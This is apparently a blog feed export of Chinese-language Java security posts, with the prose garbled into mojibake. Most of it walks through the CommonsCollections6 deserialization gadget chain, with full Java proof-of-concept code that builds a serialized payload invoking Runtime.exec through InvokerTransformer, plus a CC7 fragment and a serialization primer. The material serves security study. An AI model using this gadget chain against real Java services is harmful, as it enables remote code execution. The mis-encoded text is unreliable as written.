<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604212136853.png" alt="image-20240604212136853"></p>
<p>æœ€åå› ä¸º<code>lazyMap2</code>ä¸­å¹¶æ²¡æœ‰<code>yy</code>è¿™ä¸ª<code>key</code>ï¼Œå› æ­¤ä¼šæ‰§è¡Œä¸€ä¸ª<code>map.put(&quot;yy&quot;,&quot;yy&quot;)</code>çš„æ“ä½œæ·»åŠ ï¼Œæ‰€ä»¥åœ¨ POC ä¸­ï¼Œæˆ‘ä»¬æœ€åè¦æŠŠ<code>lazyMap2</code>çš„<code>yy</code>ç»™åˆ é™¤æ‰ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.anquanke.com/post/id/240040">ysoserial CommonsCollections7 &amp; C3P0 è¯¦ç»†åˆ†æ</a>)</p>
<p><a href="https://www.anquanke.com/post/id/248169">CCç¬¬7é“¾HashTableè§¦å‘ç‚¹æ·±å…¥åˆ†æ</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/12427015.html">javaååºåˆ—åŒ–-ysoserial-è°ƒè¯•åˆ†ææ€»ç»“ç¯‡(7)</a></p>
<p><a href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE">JAVAååºåˆ—åŒ–ä¹‹CommonCollections7åˆ©ç”¨é“¾</a></p>
<p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/8-CommonsCollections7/CommonsCollections7.md">CommonsCollections7åˆ©ç”¨é“¾åˆ†æ</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC6(æœ€å¥½ç”¨çš„CCé“¾)</title>
    <url>/2024/05/25/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC6/</url>
    <content><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li><p>JAVAç‰ˆæœ¬JAVA 21</p>
</li>
<li><p>commons-collections 3.2.1</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC1ç°åœ¨æ¥è¯´çš„è¯æ¯”è¾ƒé¸¡è‚‹ã€‚å› ä¸ºåœ¨8u71ä»¥å<code>AnnotationInvocationHandler.readObject()</code>æ”¹å˜äº†ã€‚</p>
<p>ä¸ºäº†è§£å†³é«˜ç‰ˆæœ¬çš„åˆ©ç”¨é—®é¢˜ysoserialç»™å‡ºäº†è§£å†³æ–¹æ¡ˆCommonsCollections6ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¹³å¸¸ç§°çš„CC6ã€‚</p>
<p>å…¶å®åé¢åˆ©ç”¨é“¾å’ŒCC1æ˜¯ä¸€æ ·çš„,<code>LazyMap.get()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525145206477.png" alt="image-20240525145206477"></p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>ä»ysoserialå¯ä»¥çœ‹å‡ºé“¾é¦–æ˜¯HashMapï¼Œå…¶å®HashMapæˆ‘ä»¬æŒºç†Ÿæ‚‰ã€‚<code>HashMap.readObject()-&gt;HashMap.put()-&gt;HashMap.hash().(key)HashCode()</code></p>
<p>æ‰€ä»¥ç°åœ¨åªéœ€è¦æœ‰ä¸€ä¸ªç±»çš„<code>HashCode()</code>è°ƒç”¨äº†<code>get()</code>å°±å¯ä»¥å°†è¿™æ•´æ®µé“¾é“¾æ¥èµ·æ¥ã€‚</p>
<h3 id="æ”»å‡»é“¾åˆ†æ"><a href="#æ”»å‡»é“¾åˆ†æ" class="headerlink" title="æ”»å‡»é“¾åˆ†æ"></a>æ”»å‡»é“¾åˆ†æ</h3><p>ä½œè€…æ˜¯å‘ç°äº†<code>TiedMapEntry.HashCode().getValue()</code>ä¸­è°ƒç”¨äº†<code>get()</code>,é‚£è¿™å°±å¯ä»¥æŠŠå‰åä¸¤æ®µé“¾é“¾æ¥èµ·æ¥ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163703284.png" alt="image-20240525163703284"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163727555.png" alt="image-20240525163727555"></p>
<p>å®Œæ•´åˆ©ç”¨é“¾</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC6.png" alt="CC6"></p>
<h3 id="å®ç°æ”»å‡»é“¾"><a href="#å®ç°æ”»å‡»é“¾" class="headerlink" title="å®ç°æ”»å‡»é“¾"></a>å®ç°æ”»å‡»é“¾</h3><p>åé¢ä»£ç æ‰§è¡Œçš„éƒ¨åˆ†å’ŒCC1æ˜¯ä¸€æ ·çš„ï¼Œå¤åˆ¶å°±è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <br>    <br>    	<span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ç›´æ¥<code>new TiedMapEntry</code>ï¼Œçœ‹<code>TiedMapEntry</code>çš„æ„é€ å™¨ï¼Œæ‰€ä»¥mapå¯ä»¥ç›´æ¥ä¼ å…¥ä¹‹å‰çš„chainedTransformerï¼Œkeyéšä¾¿ä¼ ã€‚</p>
<p>ç„¶å<code>new HashMap</code>ä½œä¸ºå…¥å£ï¼Œæ”¾å…¥æŠŠtiedMapEntryæ”¾è¿›keyã€‚ä¸ºä»€ä¹ˆæŠŠtiedMapEntryæ”¾è¿›keyè€Œä¸æ˜¯æ”¾è¿›valueä¸­ï¼Ÿå› ä¸º<code>HashMap.readObject</code>æ˜¯å¯¹keyè¿›è¡Œ<code>hash()</code>ã€‚åŒæ ·çš„valueéšä¾¿ä¼ ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162706680.png" alt="image-20240525162706680"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525162851644.png" alt="image-20240525162851644"></p>
<p>ä½†æ˜¯æˆ‘ä»¬åœ¨URLDNSé‚£æ¡é“¾é‡Œé¢å°±æœ‰ç»éªŒäº†ï¼Œ<code>HashMap.put</code>å°±ä¼šå¯¹keyè¿›è¡Œ<code>hash()</code>ï¼Œä¹Ÿå°±æ˜¯å¯¹keyè°ƒç”¨<code>hashCode()</code>ï¼Œä¼šç›´æ¥å¯¼è‡´åœ¨åºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥èµ°å®Œè¿™æ¡é“¾ã€‚</p>
<p>æ‰€ä»¥å¾—æ›´æ”¹ä¸€ä¸‹ï¼Œæ”¹æ³•å¾ˆå¤šï¼Œæ€è·¯å…¶å®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œputæ—¶æ”¾è¿›ä¸€ä¸ªä¸èƒ½è®©é“¾è¿æ¥èµ·æ¥çš„å¯¹è±¡æˆ–è€…æ–¹æ³•ï¼Œåºåˆ—åŒ–çš„æ—¶å€™æ”¹å›è®¾æƒ³çš„è°ƒç”¨é“¾ï¼Œè®©é“¾èƒ½è¿æ¥èµ·æ¥ã€‚</p>
<p>è¿™é‡Œä¸»è¦å†™äº†ä¸¤ç§æ–¹å¼:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€:å…ˆæŠŠä¸æŠŠtransformersæ”¾è¿›chainedTransformerä¸­ï¼Œè¿™é‡Œnewäº†ä¸ªConstantTransformer[]&#123;&#125;ï¼ŒChainedTransformerå°±è°ƒç”¨ä¸äº†transformers</span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer[]&#123;&#125;);</span><br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒ:å…ˆä¸æŠŠchainedTransformeræ”¾è¿›LazyMap.decorate()ï¼Œè¿™æ ·lazyMapä¹Ÿæ‰¾ä¸åˆ°ååŠæ¡é“¾</span><br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><span class="hljs-comment">//        lazyMap.remove(&quot;aaa&quot;);</span><br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€ï¼šé€šè¿‡åå°„å°†transformersæ”¾è¿›chainedTransformerä¸­</span><br><span class="hljs-comment">//        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;</span><br><span class="hljs-comment">//        Field iTransformersField = c2.getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="hljs-comment">//        iTransformersField.setAccessible(true);</span><br><span class="hljs-comment">//        iTransformersField.set(chainedTransformer, transformers);</span><br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒï¼šé€šè¿‡åå°„å°†chainedTransformeræ”¾è¿›lazyMapä¸­</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap, chainedTransformer);<br><br><br><br><br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//æœ¬åœ°æµ‹è¯•è§¦å‘</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="é‡åˆ°ä¸€ä¸ªå°é—®é¢˜"><a href="#é‡åˆ°ä¸€ä¸ªå°é—®é¢˜" class="headerlink" title="é‡åˆ°ä¸€ä¸ªå°é—®é¢˜"></a>é‡åˆ°ä¸€ä¸ªå°é—®é¢˜</h3><p>å‘ç°è¿™æ—¶å€™ååºåˆ—åŒ–ä¸èƒ½æˆåŠŸæ‰§è¡Œ</p>
<p>æˆ‘ä»¬å¯ä»¥å°è¯•è°ƒè¯•ä¸€ä¸‹ï¼Œæ·»åŠ ä¸€ä¸ªlnline Watchesï¼Œå¯ä»¥çœ‹åˆ°æ‰§è¡Œçš„æ—¶å€™<code>map.put(keyï¼Œvalue)</code>æŠŠ<code>key:&quot;aaa&quot;</code>putè¿›å»äº†ï¼Œå¯¼è‡´æˆ‘ä»¬ååºåˆ—åŒ–å¾—æ—¶å€™<code>if(map.containsKey(key) == false)</code>åˆ¤å®šå¤±è´¥ï¼Œå› ä¸ºè¿™æ—¶å€™<code>if(map.containsKey(key)==true)</code>ï¼Œç„¶åå°±èµ°ä¸è¿›è¿™ä¸ªifï¼Œå¯¼è‡´è°ƒç”¨<code>transform()</code>æ–¹æ³•å¤±è´¥ï¼Œæœ€ç»ˆå¯¼è‡´é“¾ä¸èƒ½æˆåŠŸæ‰§è¡Œã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525204315232.png" alt="image-20240525204315232"></p>
<p>è§£å†³æ–¹æ³•å¾ˆç®€å•ï¼Œç­‰putå®Œåï¼Œ<code>remove()</code>æ‰å°±è¡Œï¼Œéšåå°±å¯ä»¥æ­£å¸¸æ‰§è¡Œååºåˆ—åŒ–</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240525163825585.png" alt="image-20240525163825585"></p>
<h2 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€:å…ˆæŠŠä¸æŠŠtransformersæ”¾è¿›chainedTransformerä¸­ï¼Œè¿™é‡Œnewäº†ä¸ªConstantTransformer[]&#123;&#125;ï¼ŒChainedTransformerå°±è°ƒç”¨ä¸äº†transformers</span><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>[]&#123;&#125;);<br><br><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒ:å…ˆä¸æŠŠchainedTransformeræ”¾è¿›LazyMap.decorate()ï¼Œè¿™æ ·lazyMapä¹Ÿæ‰¾ä¸åˆ°ååŠæ¡é“¾</span><br><span class="hljs-comment">//        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><br><br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-comment">//æ”¹æ³•ä¸€ï¼šé€šè¿‡åå°„å°†transformersæ”¾è¿›chainedTransformerä¸­</span><br>        Class&lt;ChainedTransformer&gt; c2 = ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">iTransformersField</span> <span class="hljs-operator">=</span> c2.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersField.setAccessible(<span class="hljs-literal">true</span>);<br>        iTransformersField.set(chainedTransformer, transformers);<br><br>        <span class="hljs-comment">//æ”¹æ³•äºŒï¼šé€šè¿‡åå°„å°†chainedTransformeræ”¾è¿›lazyMapä¸­</span><br><span class="hljs-comment">//        Class c = LazyMap.class;</span><br><span class="hljs-comment">//        Field factoryField = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="hljs-comment">//        factoryField.setAccessible(true);</span><br><span class="hljs-comment">//        factoryField.set(lazyMap, chainedTransformer);</span><br><br><br><br><br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(map2);<br>        oos.close();<br><br>        <span class="hljs-comment">//æœ¬åœ°æµ‹è¯•è§¦å‘</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br><span class="hljs-comment">//        Object o = ois.readObject();</span><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://www.bilibili.com/video/BV1yP4y1p7N7/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(äºŒ)-æœ€å¥½ç”¨çš„CCé“¾</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVAååºåˆ—åŒ–</title>
    <url>/2024/05/21/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–"><a href="#ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–" class="headerlink" title="ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–"></a>ä¸ºä»€ä¹ˆJAVAéœ€è¦ååºåˆ—åŒ–</h2><p><strong>1. æ•°æ®æŒä¹…åŒ–</strong></p>
<p>åºåˆ—åŒ–å¯ä»¥å°† Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­æˆ–æ•°æ®åº“ä¸­ï¼Œè¯¥å­—èŠ‚åŒ…å«å¯¹è±¡çš„æ•°æ®ã€å¯¹è±¡çš„ç±»å‹ã€å¯¹è±¡çš„å­˜å‚¨å±æ€§ã€‚è¿™ä½¿å¾— Java ç¨‹åºå¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿å­˜å’ŒåŠ è½½æ•°æ®ï¼Œè€Œæ— éœ€æ¯æ¬¡éƒ½é‡æ–°åˆ›å»ºå¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª Java åº”ç”¨ç¨‹åºå¯ä»¥å°†ç”¨æˆ·æ•°æ®åºåˆ—åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿åœ¨ä¸‹æ¬¡å¯åŠ¨æ—¶åŠ è½½ã€‚</p>
<p><strong>2. è¿œç¨‹é€šä¿¡</strong></p>
<p>åºåˆ—åŒ–è¿˜å¯ä»¥ç”¨äºåœ¨ç½‘ç»œä¸Šä¼ è¾“ Java å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª Java åº”ç”¨ç¨‹åºå¯ä»¥å°†ä¸€ä¸ªå¯¹è±¡åºåˆ—åŒ–å¹¶å‘é€ç»™å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œæˆ–è€…å°†ä¸€ä¸ªå¯¹è±¡ä»å®¢æˆ·ç«¯å‘é€åˆ°æœåŠ¡å™¨ã€‚è¿™ä½¿å¾— Java ç¨‹åºå¯ä»¥å¾ˆå®¹æ˜“åœ°åœ¨ä¸åŒçš„æœºå™¨ä¹‹é—´å…±äº«æ•°æ®ã€‚</p>
<h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°</h2><p>åºåˆ—åŒ–å¯¹è±¡ä¼šé€šè¿‡<code>ObjectOutputStream</code>çš„<code>writeObject</code>æ–¹æ³•å°†ä¸€ä¸ªå¯¹è±¡å†™å…¥åˆ°æ–‡ä»¶ä¸­ã€‚</p>
<p>è€Œååºåˆ—åŒ–æ˜¯ä½¿ç”¨äº†<code>ObjectInputStreamç±»</code>çš„<code>readObject</code> æ–¹æ³•è¿›è¡Œè¯»å–å¹¶è¿˜åŸæˆåœ¨åºåˆ—åŒ–å‰çš„ä¸€ä¸ªç±»ã€‚</p>
<h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>å®šä¹‰äº†ä¸€ä¸ªPersonç±»ï¼Œå®ç°äº†<strong>Serializable</strong>æ¥å£ï¼Œæœ‰ä¸¤ä¸ªå±æ€§å’Œä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œé‡å†™äº†<code>toString()</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135149134.png" alt="image-20240521135149134"></p>
<p>å¯ä»¥çœ‹åˆ°<strong>Serializable</strong>æ˜¯ç©ºæ¥å£ï¼Œå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªæ ‡è®°ï¼Œå®ç°äº†å®ƒæ‰èƒ½åºåˆ—åŒ–ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135203323.png" alt="image-20240521135203323"></p>
<p>å®šä¹‰äº†ä¸€ä¸ªserializeé™æ€æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240521135344209.png" alt="image-20240521135344209"></p>
<p>åºåˆ—åŒ–çš„ç»“æœ</p>
